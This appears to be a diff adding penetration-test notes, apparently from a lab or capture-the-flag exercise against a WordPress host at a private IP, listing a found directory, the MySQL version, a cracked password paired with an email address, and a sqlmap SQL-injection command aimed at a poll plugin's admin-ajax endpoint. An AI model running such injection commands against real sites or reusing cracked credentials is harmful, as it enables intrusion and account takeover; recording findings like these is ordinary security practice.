@@ -1,0 +1,25 @@
+172.18.2.3
+
+DIR FOUND:
+=================
+
+/wordpress/
+
+=================
+
+info:
+----------
+MySQL >= 5.0.12
+
+=================
+
+Cracked hash!:
+----------------
+ticktock:estagiario@rookie.com.br
+
+============================
+
+sqli found!!!
+-----------------
+payload
+{sqlmap -u "http://example.com/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2"}
